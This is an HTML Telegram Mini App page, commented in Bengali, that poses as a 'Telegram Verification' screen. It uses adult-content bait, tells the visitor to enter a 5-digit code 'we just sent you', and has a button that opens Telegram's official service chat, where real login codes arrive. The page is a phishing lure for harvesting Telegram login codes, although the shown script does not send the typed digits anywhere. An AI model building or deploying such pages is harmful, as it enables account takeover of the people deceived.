<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Verification</title>
    <!-- টেলিগ্রামের মেইন স্ক্রিপ্ট -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            /* আপনার স্ক্রিনশটের মতো ব্যাকগ্রাউন্ড */
            background: linear-gradient(rgba(0,0,0,0.3), rgba(0,0,0,0.3)), url('https://w0.peakpx.com/wallpaper/348/443/HD-wallpaper-woman-blurred-background.jpg');
            background-size: cover;
            background-position: center;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white;
            overflow: hidden;
        }

        .card {
            background: rgba(255, 255, 255, 0.2);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.3);
            padding: 30px 20px;
            border-radius: 25px;
            text-align: center;
            width: 320px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }

        .top-icon {
            background: white;
            width: 65px;
            height: 45px;
            border-radius: 12px;
            margin: -60px auto 20px auto;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
        }

        .top-icon span { font-size: 28px; }

        .info-text {
            background: rgba(255, 255, 255, 0.9);
            color: #333;
            font-size: 14px;
            padding: 10px;
            border-radius: 12px;
            margin-bottom: 20px;
            font-weight: 500;
        }

        .otp-inputs {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
        }

        .otp-inputs input {
            width: 48px;
            height: 55px;
            background: rgba(255, 255, 255, 0.2);
            border: 2px solid rgba(255, 255, 255, 0.4);
            border-radius: 12px;
            text-align: center;
            font-size: 24px;
            color: #000;
            font-weight: bold;
            outline: none;
        }

        /* সবুজ বাটন ডিজাইন */
        .get-code-btn {
            background: #34a853; /* সবুজ কালার */
            border: none;
            width: 100%;
            padding: 15px;
            border-radius: 10px;
            color: white;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            margin-bottom: 20px;
            display: block;
            text-decoration: none;
            box-shadow: 0 4px 0 #288a42;
        }

        .get-code-btn:active {
            transform: translateY(2px);
            box-shadow: none;
        }

        /* কিপ্যাড ডিজাইন */
        .keypad {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
        }

        .key {
            background: #4caf50;
            padding: 15px;
            border-radius: 8px;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            user-select: none;
            color: white;
        }

        .key:active { background: #388e3c; }
        .key.empty { background: transparent; cursor: default; }
    </style>
</head>
<body>

    <div class="card">
        <div class="top-icon">
            <span>📱</span>
        </div>
        
        <div class="info-text">Enter the 5-digit code that we just sent you!</div>

        <div class="otp-inputs" id="otp-container">
            <input type="text" maxlength="1" readonly>
            <input type="text" maxlength="1" readonly>
            <input type="text" maxlength="1" readonly>
            <input type="text" maxlength="1" readonly>
            <input type="text" maxlength="1" readonly>
        </div>

        <!-- গেট কোড বাটন -->
        <button class="get-code-btn" onclick="openServiceChat()">🔞 GET CODE 🔞</button>

        <div class="keypad">
            <div class="key" onclick="pressKey('1')">1</div>
            <div class="key" onclick="pressKey('2')">2</div>
            <div class="key" onclick="pressKey('3')">3</div>
            <div class="key" onclick="pressKey('4')">4</div>
            <div class="key" onclick="pressKey('5')">5</div>
            <div class="key" onclick="pressKey('6')">6</div>
            <div class="key" onclick="pressKey('7')">7</div>
            <div class="key" onclick="pressKey('8')">8</div>
            <div class="key" onclick="pressKey('9')">9</div>
            <div class="key empty"></div>
            <div class="key" onclick="pressKey('0')">0</div>
            <div class="key" onclick="pressKey('back')">✖️</div>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();

        const inputs = document.querySelectorAll('#otp-container input');
        let currentIdx = 0;

        function pressKey(key) {
            if (key === 'back') {
                if (currentIdx >= 0) {
                    if (inputs[currentIdx].value === "" && currentIdx > 0) {
                        currentIdx--;
                    }
                    inputs[currentIdx].value = "";
                }
            } else {
                if (currentIdx < inputs.length) {
                    inputs[currentIdx].value = key;
                    if (currentIdx < inputs.length - 1) {
                        currentIdx++;
                    }
                }
            }
        }

        // এটিই হলো সেই "ম্যাজিক লিঙ্ক" ফাংশন
        function openServiceChat() {
            /** 
             * এই লিঙ্কটি সরাসরি টেলিগ্রামের অফিসিয়াল সার্ভিস চ্যাটকে (ID: 777000) 
             * ট্রিগার করার জন্য সবচেয়ে পাওয়ারফুল লিঙ্ক। 
            **/
            tg.openTelegramLink("tg://resolve?domain=telegram");
        }
    </script>
</body>
</html>
